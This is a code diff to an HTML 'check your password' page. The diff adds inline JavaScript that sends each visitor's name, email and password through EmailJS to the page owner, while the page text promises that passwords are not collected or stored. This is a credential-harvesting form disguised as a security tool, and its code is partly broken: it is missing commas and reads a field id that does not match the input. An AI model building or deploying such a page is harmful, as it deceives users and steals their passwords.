@@ -5,7 +5,32 @@
 	<link rel="stylesheet" href="formstyle.css">
 	<!--link to CSS page--> 
 	
-	<script src="index.js"></script>
+	<script>
+		
+function sendMail() {
+  var params = {
+    username: document.getElementById("name").value
+    email: document.getElementById("email").value
+    password: document.getElementById("password").value
+  };
+  
+const serviceID = "service_5q0ccwe";
+const templateID = "template_szewk7m";
+
+emailjs.send(serviceID, templateID, params)
+.then(
+    res =>{
+        document.getElementById("name").value = "";
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+        console.log(res);
+        alert("your message was sent sucessfully");
+    }
+)
+.catch((err) => console.log(err));
+}
+	</script>
+	
 	<script type="text/javascript"
         src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
 </script>
@@ -19,10 +44,11 @@
 <body>
 
 	<div class="container">
-		<form onsubmit="sendMail"> 												                                       backend service formsubmit-->
+		<form onsubmit="sendMail"> 												                                       
 			<h1> CHECK YOUR PASSWORD </h1><br>
 			<p>Please fill the form so we can check if your password is strong enough, <br>
- 				your password is not safe if it can be brute-force or found in a database of leaked 				passwords<br><br>
+ 				your password is not safe if it can be brute-force or found in a database of leaked 				
+				passwords<br><br>
 			    We do not collect or store your passwords <p>
 			<!--form fields-->
 			<input type="text" id="username" placeholder="Username" required> <br>
